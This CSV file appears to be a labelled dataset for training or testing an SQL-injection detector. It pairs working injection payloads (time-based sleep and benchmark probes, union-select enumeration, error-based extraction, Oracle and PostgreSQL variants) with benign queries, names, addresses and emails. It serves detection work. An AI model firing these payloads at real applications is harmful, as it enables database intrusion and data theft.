Query,Label
"1'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'toft'  =  'toft",1
" select sleep  (  5  )   and ""oivc"" like ""oivc",1
calle bertran de castellet 28 6e,0
SELECT * FROM soldier WHERE tide  BETWEEN 10 AND 20,0
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'opyt'  =  'opyt",1
1'  )   as pxcd where 9754  =  9754 or sleep  (  5  )  --,1
select 'qqpjq'||  (  select   (  case when   (  2933  =  2933  )   then 1 else 0 end   )    )   ||'qzvzq',1
" end and ""unqj""  =  ""unqj",1
SELECT * FROM stranger WHERE brass = 'sudden' LIMIT 3,0
"-8491"" where 6107  =  6107 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --",1
1'   )    )    as mbzk where 9153  =  9153 and 2006  =  2006,1
SELECT * FROM gravity WHERE car = 'doctor',0
89816761j,0
mathieso,0
69301315s,0
2.57E+15,0
SELECT * FROM yellow ORDER BY saddle,0
SELECT AVG ( guide ) FROM sentence SELECT SUM ( region ) ,0
"elt  (  2567  =  9921,9921  )  ",1
SELECT * FROM largest WHERE rhythm = 'breathe',0
SELECT AVG ( Price ) FROM operation,0
"1'  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  'iqvg'  =  'iqvg",1
"-5170'   )    )    as ovbf where 4833  =  4833 union all select 4833,4833,4833,4833--",1
3245,0
1'  )   as svtm where 7627  =  7627 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,1
SELECT COUNT ( government ) FROM powder,0
cijuela,0
"barcelona 149, 5-e",0
"1  )   as lhie where 4631  =  4631 union all select null,null,null,null,null--",1
06327548h,0
"-4056""   )    )     )   union all select 4363,4363,4363,4363,4363,4363,4363,4363#",1
olrich-shapiro1@nuriamartin.aw,0
SELECT * FROM command WHERE north = 'ear',0
8.87551E+14,0
junette6,0
-3125'   )    )     )   order by 1#,1
SELECT * FROM baseball ORDER BY giving DESC,0
select sleep  (  5  )   and    (    (     (  'klma'  =  'klma,1
SELECT * FROM broke WHERE consider NOT LIKE 'electricity%',0
8.64151E+15,0
SELECT * FROM  ( SELECT machinery FROM fog ) ,0
"  UPDATE personal SET tomorrow =  'whose', City =  'partly' WHERE cloud =  fun",0
2.55791E+15,0
SELECT COUNT ( reason ) FROM nodded,0
"-7808""   )    )    as jgkk where 9230  =  9230 or elt  (  1032  =  1032,3623  )  --",1
"-3637"" or   (  8459  =  8459  )  *4906",1
mendracaveitia torreyas,0
"1  )   where 8338  =  8338 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
"admin"" or ""1""  =  ""1",1
"SELECT customername, contactname FROM customers; ALTER TABLE Customers ADD Email varchar ( 255 ) ; ALTER TABLE Customers DROP COLUMN Email; DROP TABLE Shippers;  TRUNCATE TABLE Categories;",0
2.94331E+14,0
"1'+  (  select 'vedi' where 2774  =  2774 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
SELECT eleven ( s ) FROM these INNER JOIN,0
select   (  case when   (  2352  =  8672  )   then 2352 else 2352*  (  select 2352 from information_schema.character_sets  )   end  )  #,1
SELECT * FROM college ORDER BY jar DESC,0
"select count  (  *  )   from generate_series  (  1,5000000  )   and 'roca'  =  'roca",1
1' where 5547  =  5547,1
SELECT COUNT ( wherever ) FROM plus,0
1'  )   union all select null#,1
SELECT * FROM active FETCH FIRST 3 ROWS ONLY,0
SELECT ruler ( s )  FROM liquid,0
"1"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""xhvo""  =  ""xhvo",1
1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,1
d060u2ar,0
"1"" or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 5421 )  ORDER BY meta_id ASC",0
azema.alvir@telogis.gf,0
sylvie@laspruebascongaseosa.pk,0
"1""   )    )    as uqem where 3521  =  3521",1
"1%"" or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and ""%""  =  """,1
 (  2329  =  4209  )  *1,1
SELECT rose FROM muscle UNION SELECT tiny FROM our ORDER BY helpful,0
SELECT * FROM around FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM certainly,0
"1""   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""dksc""  =  ""dksc",1
SELECT * FROM mud FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM second,0
-7054  )   as gzvf where 9146  =  9146 or 3038  =  3038,1
1'+  (  select mavu where 4276  =  4276 rlike sleep  (  5  )  #,1
SELECT * FROM west WHERE studied BETWEEN luck09/01/1996nodded AND little15/31/1996front,0
"   SELECT shoot,state,trunk,possible,knew     (  (  warn JOIN does ON truth.kept =  shall.victory )   INNER JOIN proveON Orders.fallen =  hide.zooID ) ",0
" SELECT * FROM gravity ORDER BY arrive, strange",0
SELECT later ( s ) FROM member INNER JOIN,0
or x  =  x,1
SELECT * FROM window WHERE coffee = 'tide',0
"1   )    )    union all select null,null,null--",1
kaefer,0
bernette2,0
SELECT shine ( s FROM can RIGHT JOIN,0
SELECT * FROM related WHERE older = 'per' FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM atom 3 SELECT * FROM immediately,0
00916150z,0
select case when 7717  =  7717 then 1 else null end--,1
albatana,0
abraham,0
sliter,0
"-1048%"" or 3038  =  3038",1
"1"" where 4366  =  4366 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
o+bispar,0
wolbert.navin@cirugiaalbeiteria.nu,0
2672,0
SELECT metal FROM certain UNION ALL SELECT twenty FROM seat ORDER BY probably,0
"1   )    )    as ambt where 5198  =  5198 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",1
DELETE FROM deeply,0
SELECT COUNT ( very )  FROM easier,0
SELECT TOP 3 * FROM son SELECT * FROM race 3SELECT * FROM year,0
"  SELECT * FROM all WHERE better NOT IN  ( 'general', 'square', 'fox' )  ",0
1'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  'ifvz' like 'ifvz,1
"-2568""  )   or   (  8459  =  8459  )  *4906 and   (  ""exyw""  =  ""exyw",1
SELECT enemy ( s )  FROM five SELECT wrong FROM wind,0
" select * from users where id  =  1 or   (  1  )    =  1 union select 1,banner from v$version where rownum  =  1 -- 1",1
ehrenfri,0
SELECT * FROM character FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM planet,0
"   SELECT poet, missing, common FROM reason WHERE doing  IS NULL",0
"-4828'+  (  select qxnw where 9488  =  9488 union all select 9488,9488--",1
"1 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
"1  )   where 8474  =  8474 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
arena@productosgarantizados.uy,0
"   SELECT welcome,people,could,welcome,slowly     (  (  ship JOIN gentle ON than.page =  honor.sail )   INNER JOIN extraON Orders.blood =  shoot.ancientID ) ",0
SELECT * FROM keep WHERE wheel = 'sharp' LIMIT 3,0
SELECT TOP 3 * FROM loud,0
"almendro, 28 6?c",0
SELECT * FROM border  WHERE mighty = shallow,0
"camino del caliero, 75",0
"INSERT INTO sudden ( anybody, turn, faster, replace, tune, rose )  VALUES  ( 'coast', 'seven'. wear', 'basket', 'gave', 'count', 'worry' )  ",0
ejerci78,0
SELECT * FROM  ( SELECT funny FROM tiny ) ,0
SELECT * FROM smile WHERE finally = 'generally'  OR engineer = 'adventure',0
"INSERT INTO cool  ( mile, thank, leaf )  VALUES  ( 'row', 'tribe', 'rope' )  ",0
"  SELECT dangerous,thin,leaving FROM cow LEFT JOIN Orders ON chamber.wireID =  coast.needle ORDER BY eat.could",0
SELECT * FROM stepped WHERE tip NOT LIKE 'add%',0
"-9873"" union all select 8020,8020,8020,8020,8020,8020#",1
SELECT TOP 3 * FROM receive WHERE follow = 'riding' SELECT * FROM point,0
segundo,0
1'  )   as rbpx where 1264  =  1264,1
SELECT * FROM  ( SELECT numeral FROM experiment ) ,0
"1%'   )    )     )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
SELECT * FROM difficult  WHERE question = torn,0
"   SELECT land,flower,shop,alike,list     (  (  stone JOIN gold ON column.solution =  heading.football )   INNER JOIN eastON Orders.has =  shirt.probablyID ) ",0
1 rlike sleep  (  5  )  # urxh,1
"-7518"" or elt  (  8413  =  3995,3995  )   and ""cpnf""  =  ""cpnf",1
"-7258""  )   as wjjr where 2110  =  2110 union all select 2110,2110,2110,2110,2110,2110,2110,2110,2110--",1
"-2639""  )   where 1494  =  1494 union all select 1494--",1
23215,0
inciertamente,0
feutlins,0
silvina,0
SELECT * FROM those WHERE pine IN  ( SELECT passage FROM verb ) ,0
" SELECT City, Country FROM Customers WHERE Country = 'Germany' UNION ",0
"1""   )    )     )   and elt  (  1750  =  7826,7826  )   and    (    (     (  ""qcro""  =  ""qcro",1
"1 where 7196  =  7196 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",1
"garrotxa, 118",0
"select pg_sleep  (  5  )   and ""zhsc""  =  ""zhsc",1
"1""  )   as upjw where 3880  =  3880 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
i4sacular,0
SELECT AVG ( writer ) FROM metal,0
"INSERT INTO town  ( continued, order, would )  VALUES  ( 'sell', 'cake', 'industrial' )  ",0
6.83781E+15,0
"1"" where 7249  =  7249 union all select null,null,null,null,null,null,null,null,null,null--",1
"-5573'  )   union all select 2866,2866,2866,2866,2866,2866,2866,2866,2866--",1
5146,0
41420,0
SELECT * FROM review 3 SELECT * FROM opposite,0
SELECT AVG ( across )  FROM day  SELECT SUM ( modern ) ,0
28782647x,0
galland-charney@juanpolo.ch,0
"1 where 5401  =  5401 and elt  (  1210  =  1210,sleep  (  5   )    )   --",1
select   (  case when   (  8618  =  8706  )   then 8618 else 8618*  (  select 8618 from mysql.db  )   end  )  #,1
renny,0
"andador carlos lapetra 191, 5c",0
"1'+  (  select zbyt where 4575  =  4575 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x   )    )   +'",1
toba,0
1'  )   where 3730  =  3730 and sleep  (  5  )  #,1
"1'  )   union all select null,null--",1
37759460s,0
tamerlani@ubikuo.cc,0
28011073v,0
SELECT * FROM shelf WHERE ever BETWEEN '1996-07-01' AND '1996-07-31',0
gaetano,0
"1""  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  ""vxec"" like ""vxec",1
1' in boolean mode  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  #,1
"1'  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  'zypa'  =  'zypa",1
" select * from users where id  =  1 or @#"";  =  1 or 1  =  1 -- 1",1
-8465' where 5242  =  5242 or 3806  =  7423--,1
"1'  )   as uqkz where 8482  =  8482 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
SELECT DISTINCT trick FROM rain,0
SELECT * FROM your WHERE river = 'cast'  OR beyond = 'solid',0
end and    (    (     (  'nhub'  =  'nhub,1
gambs galatioto,0
SELECT * FROM who WHERE pure BETWEEN round09/01/1996believed AND four15/31/1996build,0
"  SELECT recently,setting FROM century WHERE be = 'solve' UNION SELECT avoid, addition FROM front",0
8.55461E+15,0
1  )   as hlcn where 1165  =  1165 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1
"1%""  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""%""  =  """,1
"-4340   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   8505  =  8505",1
"1'   )    )    as ticp where 9794  =  9794 union all select null,null,null,null,null,null,null,null--",1
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'yaml'  =  'yaml",1
"1'   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   'jnmf'  =  'jnmf",1
SELECT * FROM surrounded FETCH FIRST 50 PERCENT ROWS ONLY,0
arquitectnico,0
SELECT account ( s )  FROM torn UNION,0
"1""  )   where 2312  =  2312 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1
"1""   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   ""hhwy""  =  ""hhwy",1
9.55315E+15,0
"1',  (  case when 5204  =  2136 then 1 else null end  )  ",1
"1%""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",1
-1772' or 7911  =  4985#,1
" SELECT * FROM directly ORDER BY river ASC, return DESC",0
SELECT * FROM door WHERE slowly = 'bright'  OR best = 'season',0
alberite de san juan,0
SELECT we,0
conciliador,0
SELECT * FROM flew WHERE flame NOT LIKE 'of%',0
-8233' or 9538  =  1882#,1
"1""   )    )    as ktue where 6392  =  6392 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
godofredo,0
SELECT * FROM too WHERE similar LIKE '%material%',0
SELECT * FROM blanket WHERE remember BETWEEN '1996-07-01' AND '1996-07-31',0
"  SELECT Orders.nailsrID, Employees.automobile, Employees.activity FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.callID ORDER BY Orders.indeedID",0
"1""  )   as yecj where 1194  =  1194 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
SELECT TOP 3 * FROM consist WHERE pour = 'kept' SELECT * FROM whether,0
SELECT * FROM ocean,0
dreyfuss6,0
gering,0
 UPDATE visit SET differ = 'wash'WHERE drive = 'goes',0
"1"" or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
"1""   )    )     )   and 9198  =  9198--",1
SELECT * FROM catch WHERE instrument BETWEEN '1996-07-01' AND '1996-07-31',0
6.95924E+15,0
"1' and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and 'eqle'  =  'eqle",1
SELECT * FROM  ( SELECT worth FROM foreign ) ,0
"  (  select * from generate_series  (  3906,3906,case when   (  3906  =  3906  )   then 1 else 0 end  )   limit 1  )  ",1
collado mediano,0
"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",1
SELECT TOP 3 * FROM off SELECT * FROM dried 3SELECT * FROM bear,0
SELECT * FROM parallel WHERE eventually NOT LIKE 'parts%',0
SELECT stepped FROM necessary UNION ALL SELECT suppose FROM start ORDER BY lead,0
1%'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1
"1'   )    )    as dtwh where 9633  =  9633 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
SELECT * FROM by WHERE quickly = 'pain' LIMIT 3,0
van_bake,0
SELECT TOP 3 * FROM brush WHERE another = 'cream' SELECT * FROM trade,0
SELECT option_value FROM wp_options WHERE option_name  =  '_site_transient_wp_wps_bg_file_sync_1_process_lock' LIMIT 1,0
SELECT Count ( * )  AS climate,0
"1'  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'wfws'  =  'wfws",1
"1""  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  ""dppw"" like ""dppw",1
SELECT * FROM live,0
"1'  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  'qdsr' like 'qdsr",1
"1'  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and   (  'knhm'  =  'knhm",1
-6616  )   order by 1--,1
"INSERT INTO motor ( gasoline, something, single, because, below, announced )  VALUES  ( 'gather', 'produce'. fight', 'chart', 'plate', 'meat', 'nose' )  ",0
SELECT * FROM honor 3,0
"1""   )    )    as puws where 7006  =  7006",1
37522,0
SELECT * FROM hope WHERE seven = 'solid' FETCH FIRST 3 ROWS ONLY,0
6.58835E+15,0
SELECT * FROM night 3,0
"  UPDATE plant SET form =  'blanket', City =  'pound' WHERE hand =  flat",0
"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",1
08490721h,0
4.52635E+14,0
"1' where 4358  =  4358 union all select null,null,null,null--",1
"1'+  (  select rqcw where 9002  =  9002 union all select null,null,null,null,null,null,null,null,null#",1
dolores ibarruri 75,0
1.16E+15,0
1.93371E+15,0
"1""   )    )     )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""oyxk""  =  ""oyxk",1
